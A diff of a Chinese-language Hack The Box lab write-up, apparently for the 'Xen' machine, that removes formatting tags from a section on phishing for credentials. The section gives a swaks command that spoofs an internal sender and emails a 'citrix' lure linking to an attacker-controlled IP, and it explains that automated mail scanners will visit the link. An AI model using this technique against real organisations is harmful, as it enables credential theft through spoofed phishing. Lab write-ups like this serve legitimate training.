@@ -388,25 +388,25 @@ Target domain ............ humongousretail.com
 ```
 
 ## Phishing for Creds
-我们拿到了邮箱账号，且对方smtp邮箱开放，这里我们尝试<font style="color:rgb(13, 13, 13);">自动凭据泄露</font>
+我们拿到了邮箱账号，且对方smtp邮箱开放，这里我们尝试自动凭据泄露
 
-> <font style="color:rgb(13, 13, 13);">swaks --to sales@humongousretail.com --from jointheteam@humongousretail.com --body "citrix </font>[http://10.10.16.26/"](http://10.10.16.26/")<font style="color:rgb(13, 13, 13);"> --server humongousretail.com</font>
+> swaks --to sales@humongousretail.com --from jointheteam@humongousretail.com --body "citrix [http://10.10.16.26/"](http://10.10.16.26/") --server humongousretail.com
 >
 
 这里swaks使用条件必须是需要俩个企业邮箱，所以前面的枚举是必不可少的
 
-其次<font style="color:rgb(13, 13, 13);">--body 传递的内容需要添加citrix，由于靶场靶机环境中不存在真人点击，因此需要</font>**<font style="color:rgb(13, 13, 13);">触发企业系统 / 客户端的自动行为，邮件触发者应当是</font>**
+其次--body 传递的内容需要添加citrix，由于靶场靶机环境中不存在真人点击，因此需要**触发企业系统 / 客户端的自动行为，邮件触发者应当是**
 
-+ <font style="color:rgb(13, 13, 13);">Citrix 客户端</font>
-+ <font style="color:rgb(13, 13, 13);">浏览器插件</font>
-+ <font style="color:rgb(13, 13, 13);">内部自动化脚本</font>
-+ <font style="color:rgb(13, 13, 13);">邮件安全 / 链接检测组件</font>
++ Citrix 客户端
++ 浏览器插件
++ 内部自动化脚本
++ 邮件安全 / 链接检测组件
 
-<font style="color:rgb(13, 13, 13);">这些东西的特点是：</font>
+这些东西的特点是：
 
-+ **<font style="color:rgb(13, 13, 13);">会扫描邮件内容</font>**
-+ **<font style="color:rgb(13, 13, 13);">会识别关键字</font>**
-+ **<font style="color:rgb(13, 13, 13);">会主动访问 URL</font>**
++ **会扫描邮件内容**
++ **会识别关键字**
++ **会主动访问 URL**
 
 ```c
 ┌──(web)─(root㉿kali)-[/home/kali/Desktop/htb/xen]
